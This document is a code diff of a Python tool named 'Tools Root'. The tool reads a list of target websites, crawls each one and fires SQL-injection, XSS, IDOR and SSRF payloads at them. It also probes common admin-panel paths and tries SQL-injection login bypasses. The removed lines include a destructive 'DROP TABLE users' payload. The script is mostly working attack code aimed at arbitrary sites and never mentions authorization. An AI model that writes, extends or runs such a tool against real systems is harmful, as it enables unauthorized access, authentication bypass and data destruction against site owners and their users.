@@ -1,52 +1,25 @@
 import requests
+from bs4 import BeautifulSoup
 import os
 import time
-from colorama import Fore, Back, Style, init
+from colorama import Fore, init
 from tqdm import tqdm
-import pyfiglet
 import pandas as pd
+import pyfiglet
+from concurrent.futures import ThreadPoolExecutor
 
 init(autoreset=True)
 
-admin_paths = [
-    "admin", "admin.php", "admin/login.php", "login", "administrator", "adminpanel",
-    "admin_login", "cpanel", "dashboard", "admin_area", "admin_console", "manager", "admin.aspx"
-]
+# Vulnerability payloads
+xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
+sql_payloads = ["' OR 1=1 --", '" OR "a"="a', "' UNION SELECT NULL, NULL --"]
+idor_user_ids = [1, 2, 3, 9999]
+ssrf_payload = "http://example.com"
 
-# Check admin page availability
-def find_admin_page(url):
-    for path in admin_paths:
-        admin_url = f"{url}/{path}"
-        try:
-            response = requests.get(admin_url, timeout=10)
-            if response.status_code == 200 and "login" in response.text.lower():
-                return admin_url
-        except requests.exceptions.RequestException:
-            continue
-    return None
-
-# Bypass admin panel with payloads
-def bypass_admin_panel(admin_url):
-    payloads = [
-        {"username": "' OR 1=1 --", "password": "any"},
-        {"username": "admin", "password": "' OR '1'='1"},
-        {"username": "root", "password": "' UNION SELECT 1,2,3 --"},
-        {"username": "admin", "password": "'; DROP TABLE users; --"},
-    ]
-    for payload in payloads:
-        try:
-            response = requests.post(admin_url, data=payload, timeout=10)
-            if response.status_code == 200 and ("dashboard" in response.text.lower() or "welcome" in response.text.lower()):
-                return {"path": admin_url, "username": payload["username"], "password": payload["password"]}
-        except requests.exceptions.RequestException:
-            continue
-    return None
-
-# Check for XSS vulnerabilities
-def check_xss(url):
-    payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
+# Functions for vulnerability scanning
+def scan_xss(url):
     results = []
-    for payload in payloads:
+    for payload in xss_payloads:
         try:
             response = requests.get(f"{url}?q={payload}", timeout=10)
             if payload in response.text:
@@ -55,11 +28,9 @@ def check_xss(url):
             continue
     return results
 
-# Check for SQL Injection vulnerabilities
-def check_sql_injection(url):
-    payloads = ["' OR 1=1 --", '" OR "a"="a', "' UNION SELECT NULL, NULL --"]
+def scan_sql_injection(url):
     results = []
-    for payload in payloads:
+    for payload in sql_payloads:
         try:
             response = requests.get(f"{url}?id={payload}", timeout=10)
             if "syntax" in response.text.lower() or "mysql" in response.text.lower():
@@ -68,11 +39,9 @@ def check_sql_injection(url):
             continue
     return results
 
-# Check for IDOR vulnerabilities
-def check_idor(url):
-    user_ids = [1, 2, 3, 1000]
+def scan_idor(url):
     results = []
-    for user_id in user_ids:
+    for user_id in idor_user_ids:
         path = f"{url}/profile/{user_id}"
         try:
             response = requests.get(path, timeout=10)
@@ -82,92 +51,114 @@ def check_idor(url):
             continue
     return results
 
-# Check for SSRF vulnerabilities
-def check_ssrf(url):
-    payload = "http://example.com"
+def scan_ssrf(url):
     try:
-        response = requests.get(f"{url}?url={payload}", timeout=10)
+        response = requests.get(f"{url}?url={ssrf_payload}", timeout=10)
         if "example" in response.text.lower():
-            return {"payload": payload, "path": f"{url}?url={payload}"}
+            return {"payload": ssrf_payload, "path": f"{url}?url={ssrf_payload}"}
     except requests.exceptions.RequestException:
         return None
 
-# Display loading bar
-def display_loading():
-    print(Fore.WHITE + "Initializing the tool...")
-    bar = tqdm(range(100), desc="Loading", ncols=100, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}")
-    for _ in bar:
-        time.sleep(0.02)
-    print(Fore.GREEN + "Tool initialized successfully!")
+# Admin panel discovery and bypass
+def discover_admin_page(site):
+    admin_paths = [
+        "admin", "admin.php", "admin/login.php", "login", "administrator", "adminpanel",
+        "admin_login", "cpanel", "dashboard", "admin_area", "admin_console"
+    ]
+    for path in admin_paths:
+        admin_url = f"{site}/{path}"
+        try:
+            response = requests.get(admin_url, timeout=10)
+            if response.status_code == 200 and "login" in response.text.lower():
+                return admin_url
+        except requests.exceptions.RequestException:
+            continue
+    return None
 
-# Display welcome banner
-def display_welcome():
-    ascii_art = pyfiglet.figlet_format("Welcome to Tools Root", font="slant")
-    print(Fore.GREEN + ascii_art)
-    time.sleep(5)
-    os.system('cls' if os.name == 'nt' else 'clear')
+def bypass_admin(admin_url):
+    payloads = [
+        {"username": "' OR 1=1 --", "password": "any"},
+        {"username": "admin", "password": "' OR '1'='1"},
+        {"username": "root", "password": "' UNION SELECT 1,2,3 --"}
+    ]
+    for payload in payloads:
+        try:
+            response = requests.post(admin_url, data=payload, timeout=10)
+            if "dashboard" in response.text.lower() or response.status_code == 200:
+                return {"path": admin_url, "username": payload["username"], "password": payload["password"]}
+        except requests.exceptions.RequestException:
+            continue
+    return None
 
-# Display program name
-def display_program_name():
-    ascii_art = pyfiglet.figlet_format("Tools Root", font="slant")
-    print(Fore.LIGHTCYAN_EX + ascii_art)
+# Crawling and scanning
+def crawl_site(url):
+    try:
+        response = requests.get(url, timeout=10)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        links = [url]
+        for link in soup.find_all('a', href=True):
+            if link['href'].startswith('http'):
+                links.append(link['href'])
+            elif link['href'].startswith('/'):
+                links.append(url + link['href'])
+        return set(links)
+    except requests.exceptions.RequestException:
+        return []
 
-# Scan sites for vulnerabilities
-def scan_sites(filename):
-    with open(filename, 'r') as file:
-        sites = file.readlines()
-
+# Main scanning function
+def scan_site(url):
+    print(Fore.YELLOW + f"Scanning site: {url}")
+    links = crawl_site(url)
     results = []
 
-    for site in sites:
-        site = site.strip()
-        print(Fore.YELLOW + f"Scanning site: {site}")
-        time.sleep(1)
-
-        # Admin page detection
-        admin_url = find_admin_page(site)
-        if admin_url:
-            print(Fore.GREEN + f"Admin page found: {admin_url}")
-            bypass_result = bypass_admin_panel(admin_url)
-            if bypass_result:
-                results.append([site, "Admin Bypass", bypass_result["path"], bypass_result["username"], bypass_result["password"], "Detected"])
-            else:
-                results.append([site, "Admin Bypass", admin_url, "N/A", "N/A", "Not Detected"])
-
-        # SQL Injection
-        sql_results = check_sql_injection(site)
-        for sql in sql_results:
-            results.append([site, "SQL Injection", sql["path"], sql["payload"], "N/A", "Detected"])
-
-        # XSS
-        xss_results = check_xss(site)
-        for xss in xss_results:
-            results.append([site, "XSS", xss["path"], xss["payload"], "N/A", "Detected"])
-
-        # IDOR
-        idor_results = check_idor(site)
-        for idor in idor_results:
-            results.append([site, "IDOR", idor["path"], idor["payload"], "N/A", "Detected"])
-
-        # SSRF
-        ssrf_result = check_ssrf(site)
+    for link in links:
+        print(Fore.CYAN + f"Scanning link: {link}")
+        results.extend(scan_xss(link))
+        results.extend(scan_sql_injection(link))
+        results.extend(scan_idor(link))
+        ssrf_result = scan_ssrf(link)
         if ssrf_result:
-            results.append([site, "SSRF", ssrf_result["path"], ssrf_result["payload"], "N/A", "Detected"])
+            results.append(ssrf_result)
+    
+    admin_url = discover_admin_page(url)
+    if admin_url:
+        bypass_result = bypass_admin(admin_url)
+        if bypass_result:
+            results.append({
+                "path": bypass_result["path"], 
+                "payload": f"Username: {bypass_result['username']} Password: {bypass_result['password']}", 
+                "vulnerability": "Admin Bypass"
+            })
 
-    # Display results in a table
-    df = pd.DataFrame(results, columns=["Site", "Vulnerability", "Path", "Payload", "Username/Password", "Status"])
-    print(Fore.WHITE + df.to_string(index=False))
+    return results
 
-def main():
-    display_loading()
-    display_welcome()
-    filename = input(Fore.CYAN + "Enter the filename containing the list of websites (e.g., list.txt): ")
-
-    if os.path.exists(filename):
-        display_program_name()
-        scan_sites(filename)
+# Display results
+def display_results(results):
+    if results:
+        df = pd.DataFrame(results)
+        print(Fore.GREEN + df.to_string(index=False))
     else:
-        print(Fore.RED + f"File '{filename}' not found! Please ensure the file is in the current directory.")
+        print(Fore.RED + "No vulnerabilities detected.")
+
+# Program entry point
+def main():
+    print(Fore.LIGHTCYAN_EX + pyfiglet.figlet_format("Tools Root", font="slant"))
+    filename = input(Fore.CYAN + "Enter the file containing URLs (e.g., list.txt): ")
+
+    if not os.path.exists(filename):
+        print(Fore.RED + f"File '{filename}' not found.")
+        return
+
+    with open(filename, 'r') as file:
+        urls = [line.strip() for line in file.readlines()]
+
+    all_results = []
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = {executor.submit(scan_site, url): url for url in urls}
+        for future in tqdm(futures, desc="Scanning Sites"):
+            all_results.extend(future.result())
+
+    display_results(all_results)
 
 if __name__ == "__main__":
     main()
